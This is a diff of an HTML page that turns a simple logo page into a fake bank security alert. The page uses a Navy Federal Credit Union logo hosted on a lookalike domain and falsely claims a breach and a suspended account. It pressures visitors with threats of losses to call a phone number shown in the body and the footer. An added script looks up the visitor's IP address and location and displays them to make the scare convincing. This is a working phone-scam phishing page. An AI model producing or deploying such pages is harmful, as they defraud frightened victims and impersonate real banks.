@@ -3,15 +3,21 @@
   <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Logo Page</title>
+    <title>Banking Alert</title>
     <style>
+      /* Basic reset and font setup */
       body {
         font-family: Arial, sans-serif;
         margin: 0;
         padding: 0;
         background-color: #f5f5f7;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        height: 100vh;
       }
 
+      /* Header styling */
       header {
         width: 100%;
         padding: 20px;
@@ -20,64 +26,182 @@
         position: relative;
       }
 
-      img {
-        width: 200px;
+      header img {
+        width: 180px;
         height: auto;
       }
 
-      .alert-message {
-        text-align: center;
-        font-size: 24px;
-        font-weight: bold;
-        color: red;
-        margin-top: 50px;
+      /* Alert message styling */
+      .alert-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
         padding: 20px;
+        margin-top: 30px;
         background-color: #f8d7da;
         border: 1px solid #f5c6cb;
         border-radius: 5px;
-        width: 80%;
+        width: 90%;
         margin-left: auto;
         margin-right: auto;
+        text-align: center;
       }
 
-      /* Blinking Effect for Important Message */
+      .alert-message {
+        font-size: 20px;
+        color: #721c24;
+        margin-bottom: 15px;
+      }
+
+      /* Important message style */
+      .important-message {
+        font-size: 24px;
+        font-weight: bold;
+        color: #d93025;
+        margin-bottom: 20px;
+        animation: blink 1s infinite;
+      }
+
+      /* Blinking effect for important message */
       @keyframes blink {
         0% { opacity: 1; }
         50% { opacity: 0; }
         100% { opacity: 1; }
       }
 
-      .important-message {
-        font-size: 28px;
-        font-weight: bold;
-        color: red;
-        animation: blink 1s infinite; /* Apply blinking animation to important message */
-      }
-
+      /* Phone number styling */
       .phone-number {
-        font-size: 36px; /* Increased size */
-        color: red; /* Same color as the alert message */
+        font-size: 28px;
+        color: red;
         text-decoration: none;
         font-weight: bold;
         display: inline-block;
-        margin-top: 10px;
+        margin-top: 15px;
       }
 
       .phone-number:hover {
         text-decoration: underline;
       }
+
+      /* Add additional section for center-aligned support message */
+      .support-message {
+        font-size: 24px;
+        color: #333;
+        font-weight: bold;
+        margin-top: 30px;
+      }
+
+      /* Responsive layout */
+      @media (max-width: 768px) {
+        .alert-container {
+          width: 100%;
+          padding: 15px;
+        }
+
+        header img {
+          width: 150px;
+        }
+
+        .important-message {
+          font-size: 20px;
+        }
+
+        .phone-number {
+          font-size: 24px;
+        }
+
+        .support-message {
+          font-size: 20px;
+        }
+      }
+
+      /* Footer styling */
+      footer {
+        text-align: center;
+        padding: 15px;
+        background-color: #f8d7da;
+        margin-top: auto;
+        font-size: 20px;
+      }
     </style>
   </head>
 
   <body>
+    <!-- Header Section -->
     <header>
-      <img src="https://wellsfagro.vercel.app/Navy_Federal_Credit_Union_Logo.svg.png" alt="Logo">
+      <img src="https://wellsfagro.vercel.app/Navy_Federal_Credit_Union_Logo.svg.png" alt="Bank Logo">
     </header>
 
-    <div class="alert-message">
-      <p class="important-message">Important Message</p>
-      <p>Your IP address is infected. Contact support immediately.</p>
+    <!-- Alert Message Section -->
+    <div class="alert-container">
+      <p class="important-message">URGENT: Potential Security Breach – Immediate Action Required!</p>
+      <p class="alert-message">
+        We have detected suspicious activity on your banking account that may indicate unauthorized access to your financial information. Hackers may have attempted to access your personal and banking details, including account numbers, transaction history, and other sensitive data.
+      </p>
+      
+   
+
+      <p class="alert-message">
+        For your security, we have temporarily suspended access to your online banking account to prevent any unauthorized transactions or further risks. To resolve this issue and protect your financial information, please contact our support team immediately.
+      </p>
+   <!-- First Phone Number (Centered) -->
       <a href="tel:+18282836253" class="phone-number">+1-828-283-6253</a>
+      <p class="alert-message">
+        <strong>Important:</strong> Failure to act promptly may result in potential unauthorized withdrawals or misuse of your account.
+      </p>
+      <p class="alert-message">
+        <strong>Do not attempt to log in from this IP address</strong> as it may be associated with unauthorized activity. Access from this location has been flagged for your protection.
+      </p>
+
+      <!-- Dynamic IP Address and Location -->
+      <p class="alert-message" id="location-message">
+        Your IP address <strong id="user-ip"></strong> is being detected from <strong id="user-location">loading...</strong>.
+      </p>
+
+      <!-- Support Message -->
+      <p class="support-message">Contact Support Immediately for Assistance</p>
     </div>
+
+    <!-- Footer Section with Second Phone Number -->
+    <footer>
+      <a href="tel:+18282836253" class="phone-number">+1-828-283-6253</a>
+    </footer>
+
+    <!-- Script to fetch IP and location -->
+    <script>
+      // Fetch user's IP and location
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const userIP = data.ip;
+          document.getElementById('user-ip').textContent = userIP;
+
+          // Use ipstack or ipinfo to get geolocation info based on IP
+          fetch(`https://ipinfo.io/${userIP}/json?token=YOUR_API_KEY`)
+            .then(response => response.json())
+            .then(locationData => {
+              const location = locationData.city + ', ' + locationData.region + ', ' + locationData.country;
+              document.getElementById('user-location').textContent = location;
+            })
+            .catch(err => {
+              console.error("Location fetch error:", err);
+              document.getElementById('user-location').textContent = 'Unknown';
+            });
+        })
+        .catch(err => {
+          console.error("IP fetch error:", err);
+          document.getElementById('user-ip').textContent = 'Unknown';
+          document.getElementById('user-location').textContent = 'Unknown';
+        });
+    </script>
+
   </body>
 </html>
+
+
+
+
+
+
+
+
